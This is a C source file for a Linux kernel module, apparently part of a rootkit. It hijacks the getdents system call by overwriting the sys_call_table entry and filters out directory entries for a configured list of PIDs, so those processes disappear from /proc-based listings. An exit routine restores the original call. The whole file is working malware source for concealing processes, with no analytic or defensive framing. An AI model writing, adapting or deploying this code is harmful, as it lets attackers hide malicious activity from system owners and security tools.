#include "hide_process.h"
atomic_t in_process_orig_syscall = ATOMIC_INIT(0);
int PIDs[10];
int numPIDs;
asmlinkage int (*process_original_getdents) (unsigned int, struct linux_dirent __user *, unsigned int);

bool checkPID(long curpid){
	int i;
	for( i = 0; i<numPIDs; i++){
		if(curpid == PIDs[i])
			return true;	
	}
	return false;
}

asmlinkage int process_hacked_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	int ret;
	int len;
	int curlen;
	long curpid;

	atomic_inc(&in_process_orig_syscall); 
	ret = process_original_getdents(fd,dirp,count);	
	len = ret;

	while(len>0)
	{
		curlen  = dirp->d_reclen;
		len = len-curlen;

		if(kstrtol(dirp->d_name,0,&curpid) == 0){		// This is getting interesting
					
			if(checkPID(curpid)){ 
				DEBUGMSG("Found a Task to be hidden: %ld - %s\n", curpid, pid_task(find_vpid(curpid), PIDTYPE_PID)->comm);
				memmove(dirp, (char*) dirp + dirp->d_reclen,len);
				ret -= curlen;
			}
			else if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}
		else {	// not an interesting entry
			if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}

	}

	atomic_dec(&in_process_orig_syscall);
	return ret;
}

int init_hide_process(void)
{	
	int i;
	DEBUGMSG("inserting...\n");

	DEBUGMSG("numPIDs: %d\n",numPIDs);
	for(i = 0; i<numPIDs; i++) {
		DEBUGMSG("Task to be hidden:  %d - %s\n",PIDs[i], pid_task(find_vpid(PIDs[i]), PIDTYPE_PID)->comm);
	}

	make_rw((unsigned long)sys_call_table);
	process_original_getdents = (void*)*(sys_call_table + __NR_getdents);
	*(sys_call_table + __NR_getdents) = (unsigned long)process_hacked_getdents;
	make_ro((unsigned long)sys_call_table);
	DEBUGMSG("Hock is running; processes should be hidden\n");

	return 0;
}

void exit_hide_process(void)
{
	DEBUGMSG("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)process_original_getdents;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_process_orig_syscall)!=0) 
		DEBUGMSG("waiting for instance to be finished\n");
	while(atomic_read(&in_process_orig_syscall)!=0){
		msleep(10);
	}
	DEBUGMSG("hook is not running anymore\n");
} 
